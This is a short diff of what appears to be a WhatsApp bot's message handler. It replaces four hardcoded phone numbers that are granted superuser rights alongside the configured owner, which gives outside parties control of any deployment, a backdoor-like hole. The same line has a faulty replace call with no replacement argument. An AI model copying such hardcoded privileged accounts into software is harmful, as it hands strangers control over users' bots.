@@ -606,10 +606,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             
             const nomAuteurMessage = ms.pushName;
-            const FranceKing = '254757835036';
-            const FranceKing1 = '254751284190';
-            const FranceKing2 = "254750948696";
-            const FranceKing3 = '254742063632';
+            const FranceKing = '254748387615';
+            const FranceKing1 = '254796299159';
+            const FranceKing2 = "254743995989";
+            const FranceKing3 = '254752925938';
             
             const superUserNumbers = [servBot, FranceKing, FranceKing1, FranceKing2, FranceKing3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers;
